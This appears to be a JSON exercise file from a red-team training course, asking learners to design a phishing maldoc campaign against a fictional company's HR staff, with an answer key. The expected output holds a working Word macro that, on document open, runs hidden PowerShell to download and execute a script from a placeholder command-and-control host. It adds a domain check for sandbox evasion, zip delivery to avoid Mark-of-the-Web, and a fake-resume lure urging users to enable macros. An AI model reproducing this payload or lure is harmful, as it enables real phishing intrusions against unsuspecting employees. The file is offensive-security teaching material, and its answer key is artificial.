@@ -1,0 +1,16 @@
+{
+    "id": "task2",
+    "chapterId": "ch_10",
+    "title": "Design a Maldoc Lure & Payload Strategy",
+    "description": "Create a comprehensive plan for a simulated Red Team maldoc campaign.",
+    "estimatedMinutes": 25,
+    "problemStatement": "# Scenario: The Phishing Campaign\n\nYou are a Red Teamer targeting **Apex Innovations**, a mid-sized tech company. Your goal is to gain initial access via a malicious Word document delivered by email. The target department is **Human Resources**.\n\n**OSINT Data:**\n- Apex uses **Workday** for HR management.\n- The company recently announced a **'Summer Internship Program'**.\n- HR staff frequently receive **resumes and cover letters**.\n\n**Task:** Design a complete maldoc campaign covering:\n\n1. **Pretext & Lure Design:**\n   - What is the email subject line?\n   - What is the document filename?\n   - What does the user see in the Word document *before* enabling macros? (Describe the lure content).\n\n2. **VBA Payload Strategy:**\n   - Will you use a one-stage or two-stage payload? Why?\n   - Write the **exact VBA code** that would run (you can use a placeholder URL).\n\n3. **Delivery & Evasion:**\n   - How will you deliver the document to bypass MOTW? (e.g., direct attachment, .zip, .iso?).\n   - What evasion technique will you use to avoid sandbox analysis?\n\n**Output Format:**\n```\n1. Pretext & Lure Design:\n   - Email Subject: [Subject]\n   - Filename: [Filename]\n   - Lure Content: [Description]\n\n2. VBA Payload Strategy:\n   - Type: [One-stage / Two-stage] [Reason]\n   - VBA Code:\n     ```vba\n     [Your code]\n     ```\n\n3. Delivery & Evasion:\n   - Delivery Method: [Method and reasoning]\n   - Evasion Technique: [Technique]\n```",
+    "hints": [
+        "Hint 1: Leverage the internship program and HR's use of Workday for relevance.",
+        "Hint 2: Use a two-stage payload for flexibility and smaller macro size.",
+        "Hint 3: Deliver as a .docm inside a .zip to potentially bypass MOTW.",
+        "Hint 4: Add a domain check (e.g., `Environ(\"USERDNSDOMAIN\")`) for sandbox evasion."
+    ],
+    "expectedOutput": "1. Pretext & Lure Design:\n   - Email Subject: 'Application: Summer Internship - John Smith Resume'\n   - Filename: 'John_Smith_Resume.docm'\n   - Lure Content: Document opens with a blurry 'Resume' image and text: 'This resume was created in a secure format. Enable Macros to view the document.'\n\n2. VBA Payload Strategy:\n   - Type: Two-stage. Keeps the macro small and less suspicious; allows updating the final payload without resending the document.\n   - VBA Code:\n     ```vba\n     Private Sub Document_Open()\n         If Not Environ(\"USERDNSDOMAIN\") = \"APEX.LOCAL\" Then Exit Sub\n         Dim strCmd As String\n         strCmd = \"powershell -WindowStyle Hidden -NoP -EP Bypass -Command IEX(New-Object Net.WebClient).DownloadString('https://c2-server/beacon.ps1')\"\n         CreateObject(\"WScript.Shell\").Run strCmd, 0, False\n     End Sub\n     ```\n\n3. Delivery & Evasion:\n   - Delivery Method: Attach a .zip file containing the .docm. Extraction may prevent MOTW.\n   - Evasion Technique: Domain check ensures payload only executes on Apex corporate network, not in a generic sandbox.",
+    "solutionCode": "See expected output above."
+}
